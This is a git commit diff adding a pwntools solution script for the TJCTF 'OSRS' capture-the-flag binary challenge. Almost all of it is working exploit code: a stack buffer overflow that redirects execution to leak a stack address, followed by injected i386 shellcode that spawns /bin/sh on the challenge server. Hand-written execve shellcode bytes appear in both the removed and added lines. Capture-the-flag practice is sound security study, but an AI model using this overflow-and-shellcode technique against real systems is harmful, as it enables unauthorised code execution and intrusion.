b1cde887941a1bb3ac2d997011955aa634f4bf61
Mikael Kall <Mikael.Kall@kindredgroup.com>
2020-05-28 18:47:06 +0200

    OSRS solution

--- tjctf/pwn/OSRS/solution.py
+++ tjctf/pwn/OSRS/solution.py
@@ -7,22 +7,38 @@ def pwn():
 
     io = process('./osrs')
     #io = remote('p1.tjctf.org', 8006)
-    #addr = p32(0xffffcbc4)
+   
+    elf = ELF('./osrs')
+    get_tree = elf.sym['get_tree']
+    payload = 'A'*0x110 + p32(get_tree)
+    io.sendline(payload)
+    
+    stack = io.recvline_startswith("I don't have the tree")[-9:-3] + 2**32
+    info("stack=%#x", stack)
 
     #shellcode = asm(shellcraft.sh())
-    shellcode='\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
-    print(len(shellcode))
-
-    #print(len(shellcode))
-    addr = p32(0xffffd500)
+    shellcode='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+    nop = '\x90'
 
     # 272
-    buf = '\x90' * 243 + shellcode + addr + '\x90' * 20 + shellcode
+    #buf = nop * 110 + p32(stack + 0x150) + nop * 0x200 + shellcode
+    #io.sendline(buf)
+    #io.recv()
+    #io.interactive()
 
-    print(io.recvuntil('Enter a tree type:'))
-    io.sendline(buf + '\n')
-    io.recv()
-    io.interactive()
+def pwn2():
+
+    get_tree = ELF('./osrs').symbols['get_tree']
+    r_offset = 0x10C+4
+    r = remote('p1.tjctf.org', 8006)
+    #r = process('./osrs')
+    r.sendlineafter(': \n', r_offset*'A' + p32(get_tree))
+    r.recvuntil('tree ')
+    s_addr = (1<<32)+int(r.recvuntil(' '))
+    sh = asm(shellcraft.i386.linux.sh(), arch='i386')
+    r.sendlineafter(': \n', sh.ljust(r_offset) + p32(s_addr+4))
+    r.interactive()
+
 
 if __name__ == '__main__':
-    pwn()
+    pwn2()
